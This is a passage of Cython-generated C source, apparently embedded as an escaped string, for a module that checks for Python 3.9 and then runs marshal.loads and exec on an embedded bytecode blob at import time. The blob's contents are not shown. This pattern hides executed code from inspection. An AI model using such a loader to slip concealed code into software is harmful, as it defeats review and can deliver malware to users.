__Pyx_RefNannyFinishContext();\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\\n  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __p""yx_L1_error)\\n  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  return 0;\\n  __pyx_L1_error:;\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\\n\\nstatic int __Pyx_modinit_global_init_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_global_init_code\\\", 0);\\n  /*--- Global init code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_variable_export_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_variable_export_code\\\", 0);\\n  /*--- Variable export code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modi\"\"nit_function_export_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_function_export_code\\\", 0);\\n  /*--- Function export code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_type_init_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_type_init_code\\\", 0);\\n  /*--- Type init code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_type_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_type_import_code\\\", 0);\\n  /*--- Type import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;""\\n}\\n\\nstatic int __Pyx_modinit_variable_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_variable_import_code\\\", 0);\\n  /*--- Variable import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\nstatic int __Pyx_modinit_function_import_code(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_modinit_function_import_code\\\", 0);\\n  /*--- Function import code ---*/\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n}\\n\\n\\n#ifndef CYTHON_NO_PYINIT_EXPORT\\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\\n#elif PY_MAJOR_VERSION < 3\\n#ifdef __cplusplus\\n#define __Pyx_PyMODINIT_FUNC extern \\\"C\\\" void\\n#else\\n#define __Pyx_PyMODINIT_FUNC void\\n#endif\\n#else\\n#ifdef __cplusplus\\n#define __Pyx_PyMODINIT_FUNC extern \\\"C\\\" PyObject *\\n#else\\n#define __Pyx_PyMODINIT_FUNC PyObject *\\n#endif\\n#endif\\n\\n\\n#if PY_MAJOR_VERSION < 3\\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\\n__Pyx_PyMODINIT_FUNC initsource(void)\\n#else\\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\n{\\n  return PyModuleDef_Init(&__pyx_moduledef);\\n}\\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\\n    #if PY_VERSION_HEX >= 0x030\"\"700A1\\n    static PY_INT64_T main_interpreter_id = -1;\\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\\n    if (main_interpreter_id == -1) {\\n        main_interpreter_id = current_id;\\n        return (unlikely(current_id == -1)) ? -1 : 0;\\n    } else if (unlikely(main_interpreter_id != current_id))\\n    #else\\n    static PyInterpreterState *main_interpreter = NULL;\\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\\n    if (!main_interpreter) {\\n        main_interpreter = current_interpreter;\\n    } else if (unlikely(main_interpreter !="" current_interpreter))\\n    #endif\\n    {\\n        PyErr_SetString(\\n            PyExc_ImportError,\\n            \\\"Interpreter change detected - this module can only be loaded into one interpreter per process.\\\");\\n        return -1;\\n    }\\n    return 0;\\n}\\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\\n    int result = 0;\\n    if (likely(value)) {\\n        if (allow_none || value != Py_None) {\\n            result = PyDict_SetItemString(moddict, to_name, value);\\n        }\\n        Py_DECREF(value);\\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\\n        PyErr_Clear();\\n    } else {\\n        result = -1;\\n    }\\n    return result;\\n}\\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\\n    PyObject *module = NULL, *moddict, *modname;\\n    if (__Pyx_check_single_interpreter())\\n        return NULL;\\n    if (__pyx_m)\\n        return __Pyx_NewRef(__pyx_m);\\n    modname = PyObject_GetAttrString(spec, \\\"name\\\");\\n    if (unlikely(!modname)) goto bad;\\n    module = PyModule_NewObject(modname);\\n    Py_DECREF(modname);\\n    if (unlikely(!module)) goto bad;\\n    moddict = PyModule_GetDict(module);\\n    if (unlikely(!moddict)) goto bad;\\n    if (\"\"unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"loader\\\", \\\"__loader__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"origin\\\", \\\"__file__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"parent\\\", \\\"__package__\\\", 1) < 0)) goto bad;\\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \\\"submodule_search_locations\\\", \\\"__path__\\\", 0) < 0)) goto bad;\\n    return module;\\nbad:\\n    Py_XDECREF(module);\\n    return NULL;\\n}\\n\\n""\\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\\n#endif\\n#endif\\n{\\n  PyObject *__pyx_t_1 = NULL;\\n  PyObject *__pyx_t_2 = NULL;\\n  int __pyx_t_3;\\n  int __pyx_lineno = 0;\\n  const char *__pyx_filename = NULL;\\n  int __pyx_clineno = 0;\\n  __Pyx_RefNannyDeclarations\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  if (__pyx_m) {\\n    if (__pyx_m == __pyx_pyinit_module) return 0;\\n    PyErr_SetString(PyExc_RuntimeError, \\\"Module 'source' has already been imported. Re-initialisation is not supported.\\\");\\n    return -1;\\n  }\\n  #elif PY_MAJOR_VERSION >= 3\\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\\n  #endif\\n  #if CYTHON_REFNANNY\\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\"refnanny\\\");\\nif (!__Pyx_RefNanny) {\\n  PyErr_Clear();\\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\\\"Cython.Runtime.refnanny\\\");\\n  if (!__Pyx_RefNanny)\\n      Py_FatalError(\\\"failed to import 'refnanny' module\\\");\\n}\\n#endif\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\\\", 0);\\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\\n  __Pxy_PyFrame_Initialize_Offsets();\\n  #endif\\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\\\"\\\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\\\"\\\", 0); if (unlikely(!__p\"\"yx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #ifdef __Pyx_CyFunction_USED\\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_FusedFunction_USED\\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_Coroutine_USED\\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_Generator_USED\\n  if (__py""x_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_AsyncGen_USED\\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  #ifdef __Pyx_StopAsyncIteration_USED\\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  /*--- Library function declarations ---*/\\n  /*--- Threads initialization code ---*/\\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\\n  PyEval_InitThreads();\\n  #endif\\n  /*--- Module creation code ---*/\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  __pyx_m = __pyx_pyinit_module;\\n  Py_INCREF(__pyx_m);\\n  #else\\n  #if PY_MAJOR_VERSION < 3\\n  __pyx_m = Py_InitModule4(\\\"source\\\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\\n  #else\\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\\n  #endif\\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  Py_INCREF(__pyx_d);\\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  Py_INCREF(__pyx_b);\\n  __pyx_cython_runtime = PyImport_AddModule((char *) \\\"cython_runtime\\\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  Py_INCREF(__pyx_cython_runtime);\\n  if (PyObject_SetAttrString(__pyx_m, \\\"__builtins__\\\", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Initialize various global constants etc. ---*/\\n  if (__Pyx_InitGlobals\"\"() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n  if (__pyx_module_is_main_source) {\\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(""0, 4, __pyx_L1_error)\\n  }\\n  #if PY_MAJOR_VERSION >= 3\\n  {\\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)\\n    if (!PyDict_GetItemString(modules, \\\"source\\\")) {\\n      if (unlikely(PyDict_SetItemString(modules, \\\"source\\\", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)\\n    }\\n  }\\n  #endif\\n  /*--- Builtin init code ---*/\\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Constants init code ---*/\\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  /*--- Global type/function init code ---*/\\n  (void)__Pyx_modinit_global_init_code();\\n  (void)__Pyx_modinit_variable_export_code();\\n  (void)__Pyx_modinit_function_export_code();\\n  (void)__Pyx_modinit_type_init_code();\\n  (void)__Pyx_modinit_type_import_code();\\n  (void)__Pyx_modinit_variable_import_code();\\n  (void)__Pyx_modinit_function_import_code();\\n  /*--- Execution code ---*/\\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  #endif\\n\\n\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\\n  __Pyx_D\"\"ECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_""GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, -1L, NULL, NULL, &__pyx_slice__5, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = PyUnicode_Join(__pyx_kp_u_, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n\"\"_s_PYTHON_VERSION); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __pyx_t_3 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_3_9, Py_NE)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 9, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;""\\n  if (__pyx_t_3) {\\n\\n\\n    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_1);\\n    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_2);\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_1);\\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_2);\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n    __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_1);\\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n\\n\\n    __pyx_t_2 = PyUnicode_Replace(__pyx_kp_u_No_support_for_VALUE, __pyx_kp_u_VERSION, __pyx_t_1, -1L); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_2);\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_1);\\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n\\n\\n    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__6, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)\\n    __Pyx_GOTREF(__pyx_t_1);\\n    __Pyx_DECREF(__pyx_t_1); \"\"__pyx_t_1 = 0;\\n\\n\\n  }\\n\\n\\n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_load""s); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_1);\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n\\n\\n  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_2);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n\\n  /*--- Wrapped vars code ---*/\\n\\n  goto __pyx_L0;\\n  __pyx_L1_error:;\\n  __Pyx_XDECREF(__pyx_t_1);\\n  __Pyx_XDECREF(__pyx_t_2);\\n  if (__pyx_m) {\\n    if (__pyx_d) {\\n      __Pyx_AddTraceback(\\\"init source\\\", __pyx_clineno, __pyx_lineno, __pyx_filename);\\n    }\\n    Py_CLEAR(__pyx_m);\\n  } else if (!PyErr_Occurred()) {\\n    PyErr_SetString(PyExc_ImportError, \\\"init source\\\");\\n  }\\n  __pyx_L0:;\\n  __Pyx_RefNannyFinishContext();\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  return (__pyx_m != NULL) ? 0 : -1;\\n  #elif PY_MAJOR_VERSION >= 3\\n  return __pyx_m;\\n  #else\\n  return;\\n  #endif\\n}\\n\\n/* --- Runtime support code --- */\\n/* Refnanny */\\n#if CYTHON_REFNANNY\\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\\n    PyObject *m = NULL, *p = NULL;\\n    void *r = NULL;\\n    m = PyImport_ImportModule(modname);\\n    if (!m) goto end;\\n    p = PyObject_GetAttrString(m, \\\"RefNannyAPI\\\");\\n    if (\"\"!p) goto end;\\n    r = PyLong_AsVoidPtr(p);\\nend:\\n    Py_XDECREF(p);\\n    Py_XDECREF(m);\\n    return (__Pyx_RefNannyAPIStruct *)r;\\n}\\n#endif\\n\\n/* PyObjectGetAttrS""tr */\\n#if CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\\n    PyTypeObject* tp = Py_TYPE(obj);\\n    if (likely(tp->tp_getattro))\\n        return tp->tp_getattro(obj, attr_name);\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(tp->tp_getattr))\\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\\n#endif\\n    return PyObject_GetAttr(obj, attr_name);\\n}\\n#endif\\n\\n/* GetBuiltinName */\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\\n    if (unlikely(!result)) {\\n        PyErr_Format(PyExc_NameError,\\n#if PY_MAJOR_VERSION >= 3\\n            \\\"name '%U' is not defined\\\", name);\\n#else\\n            \\\"name '%.200s' is not defined\\\", PyString_AS_STRING(name));\\n#endif\\n    }\\n    return result;\\n}\\n\\n/* Import */\\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\\n    PyObject *empty_list = 0;\\n    PyObject *module = 0;\\n    PyObject *global_dict = 0;\\n    PyObject *empty_dict = 0;\\n    PyObject *list;\\n    #if PY_MAJOR_VERSION < 3\\n    PyObject *py_import;\\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\\n    if (!py_import)\\n        goto bad;\\n    #endif\\n    if (from_list)\\n        list = from_list;\\n    else {\\n        empty_list = PyList_New(0);\\n        if (!empty_list)\\n            goto bad;\\n        list = empty_list;\\n    }\\n    global_dict = PyModule_GetDict(__pyx_m);\\n    if (!global_dict)\\n        goto bad;\\n    empty_dict = PyDict_New();\\n    if (!empty_dict)\\n        goto bad;\\n    {\\n        #if PY_MAJOR_VERSION >= 3\\n        if (level == -1) {\\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\\n                module = PyImport_ImportModuleLevelObject(\\n                    name, globa\"\"l_dict, empty_dict, list, 1);\\n                if (!module) {\\n                    if (!PyE""rr_ExceptionMatches(PyExc_ImportError))\\n                        goto bad;\\n                    PyErr_Clear();\\n                }\\n            }\\n            level = 0;\\n        }\\n        #endif\\n        if (!module) {\\n            #if PY_MAJOR_VERSION < 3\\n            PyObject *py_level = PyInt_FromLong(level);\\n            if (!py_level)\\n                goto bad;\\n            module = PyObject_CallFunctionObjArgs(py_import,\\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\\n            Py_DECREF(py_level);\\n            #else\\n            module = PyImport_ImportModuleLevelObject(\\n                name, global_dict, empty_dict, list, level);\\n            #endif\\n        }\\n    }\\nbad:\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(py_import);\\n    #endif\\n    Py_XDECREF(empty_list);\\n    Py_XDECREF(empty_dict);\\n    return module;\\n}\\n\\n/* PyDictVersioning */\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\\n}\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\\n    PyObject **dictptr = NULL;\\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\\n    if (offset) {\\n#if CYTHON_COMPILING_IN_CPYTHON\\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\\n#else\\n        dictptr = _PyObject_GetDictPtr(obj);\\n#endif\\n    }\\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\\n}\\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\\n        return 0;\"\"\\n    return obj_dict_version == __Py""x_get_object_dict_version(obj);\\n}\\n#endif\\n\\n/* GetModuleGlobalName */\\n#if CYTHON_USE_DICT_VERSIONS\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\\n#else\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\\n#endif\\n{\\n    PyObject *result;\\n#if !CYTHON_AVOID_BORROWED_REFS\\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        return __Pyx_NewRef(result);\\n    } else if (unlikely(PyErr_Occurred())) {\\n        return NULL;\\n    }\\n#else\\n    result = PyDict_GetItem(__pyx_d, name);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        return __Pyx_NewRef(result);\\n    }\\n#endif\\n#else\\n    result = PyObject_GetItem(__pyx_d, name);\\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\\n    if (likely(result)) {\\n        return __Pyx_NewRef(result);\\n    }\\n    PyErr_Clear();\\n#endif\\n    return __Pyx_GetBuiltinName(name);\\n}\\n\\n/* PyObjectCall */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\\n    PyObject *result;\\n    ternaryfunc call = Py_TYPE(func)->tp_call;\\n    if (unlikely(!call))\\n        return PyObject_Call(func, arg, kw);\\n    if (unlikely(Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")))\\n        return 